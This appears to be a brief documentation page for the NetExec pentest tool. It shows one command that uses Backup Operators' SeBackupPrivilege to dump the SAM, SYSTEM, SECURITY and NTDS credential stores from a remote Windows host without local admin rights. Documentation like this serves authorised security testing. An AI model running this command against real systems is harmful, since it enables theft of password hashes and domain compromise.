# Dump SAM, SYSTEM, SECURITY, NTDS with SeBackupPrivilege 

### Dump hashes using with BackupOperators 

{% hint style="warning" %}
You don't need to local admin privilege on the remote target if you are in SeBackupPrivilege
{% endhint %}

```bash
nxc smb <ip> -u username -p password -M backup_operator
```

![image](https://github.com/user-attachments/assets/88d5aa2d-4369-4dac-815f-1dbe80b12ad6)
